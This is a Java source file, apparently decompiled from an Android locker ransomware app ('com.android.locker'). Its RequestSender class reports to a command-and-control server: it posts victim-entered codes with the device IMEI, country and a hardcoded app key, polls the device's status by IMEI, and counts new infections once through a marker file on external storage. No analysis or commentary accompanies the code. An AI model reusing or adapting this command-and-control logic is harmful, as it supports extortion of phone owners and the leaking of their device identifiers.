package com.android.locker;

import android.content.Context;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Environment;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.AbstractHttpEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public class RequestSender {
    Context context;

    RequestSender(Context context) {
        this.context = context;
    }

    public boolean isOnline() {
        NetworkInfo netInfo = ((ConnectivityManager) this.context.getSystemService("connectivity")).getActiveNetworkInfo();
        if (netInfo == null || !netInfo.isConnectedOrConnecting()) {
            return false;
        }
        return true;
    }

    public void sendCode(String code, String imei) {
        InputStream is = null;
        String result = "";
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(this.context.getString(R.string.server_address));
        try {
            List<NameValuePair> nameValuePairs = new ArrayList(3);
            Date cDate = new Date(System.currentTimeMillis());
            nameValuePairs.add(new BasicNameValuePair("method", "alladd"));
            nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
            nameValuePairs.add(new BasicNameValuePair("date", cDate.getDate() + "." + (cDate.getMonth() + 1) + "." + (cDate.getYear() + 1900)));
            nameValuePairs.add(new BasicNameValuePair("country", new StringBuilder(String.valueOf(Locale.getDefault().getISO3Country())).append("_").append(imei).toString()));
            nameValuePairs.add(new BasicNameValuePair("code", code));
            nameValuePairs.add(new BasicNameValuePair("imei", imei));
            AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, "UTF-8");
            uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
            uefe.setContentEncoding("UTF-8");
            httppost.setEntity(uefe);
            is = httpclient.execute(httppost).getEntity().getContent();
        } catch (Throwable e) {
            Log.v("ERROR", e.toString());
        }
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
            StringBuilder sb = new StringBuilder();
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    is.close();
                    result = sb.toString();
                    SenderActivity.debug(code);
                    return;
                }
                sb.append(new StringBuilder(String.valueOf(line)).append("\n").toString());
            }
        } catch (Throwable e2) {
            Log.e("log_tag", "Error converting result " + e2.toString());
        }
    }

    public String checkState(String imei) {
        InputStream is = null;
        String result = "";
        HttpClient httpclient = new DefaultHttpClient();
        HttpPost httppost = new HttpPost(this.context.getString(R.string.server_address));
        try {
            List<NameValuePair> nameValuePairs = new ArrayList(3);
            Date cDate = new Date(System.currentTimeMillis());
            nameValuePairs.add(new BasicNameValuePair("method", "devicestatus"));
            nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
            nameValuePairs.add(new BasicNameValuePair("imei", imei));
            AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, "UTF-8");
            uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
            uefe.setContentEncoding("UTF-8");
            httppost.setEntity(uefe);
            is = httpclient.execute(httppost).getEntity().getContent();
        } catch (Throwable e) {
            Log.v("ERROR", e.toString());
        }
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
            StringBuilder sb = new StringBuilder();
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    is.close();
                    return sb.toString();
                }
                sb.append(new StringBuilder(String.valueOf(line)).append("\n").toString());
            }
        } catch (Throwable e2) {
            Log.e("log_tag", "Error converting result " + e2.toString());
            return "";
        }
    }

    public boolean checkFlagFile() {
        File file = new File(Environment.getExternalStorageDirectory() + "/" + "droidflag.syst");
        if (file.exists()) {
            return true;
        }
        try {
            OutputStream fo = new FileOutputStream(file);
            fo.write("datadata".getBytes());
            fo.close();
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return false;
    }

    public void sendIncrement() {
        if (!checkFlagFile()) {
            InputStream is = null;
            String result = "";
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost(this.context.getString(R.string.server_address));
            try {
                List<NameValuePair> nameValuePairs = new ArrayList(3);
                Date cDate = new Date(System.currentTimeMillis());
                nameValuePairs.add(new BasicNameValuePair("method", "counter"));
                nameValuePairs.add(new BasicNameValuePair("app_key", "f5h3d8jh2g6nv6gk7g2was1g4ncmpu3"));
                AbstractHttpEntity uefe = new UrlEncodedFormEntity(nameValuePairs, "UTF-8");
                uefe.setContentType("application/x-www-form-urlencoded; charset=UTF-8");
                uefe.setContentEncoding("UTF-8");
                httppost.setEntity(uefe);
                is = httpclient.execute(httppost).getEntity().getContent();
            } catch (Throwable e) {
                Log.v("ERROR", e.toString());
            }
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"), 8);
                StringBuilder sb = new StringBuilder();
                while (true) {
                    String line = reader.readLine();
                    if (line == null) {
                        is.close();
                        result = sb.toString();
                        return;
                    }
                    sb.append(new StringBuilder(String.valueOf(line)).append("\n").toString());
                }
            } catch (Throwable e2) {
                Log.e("log_tag", "Error converting result " + e2.toString());
            }
        }
    }
}
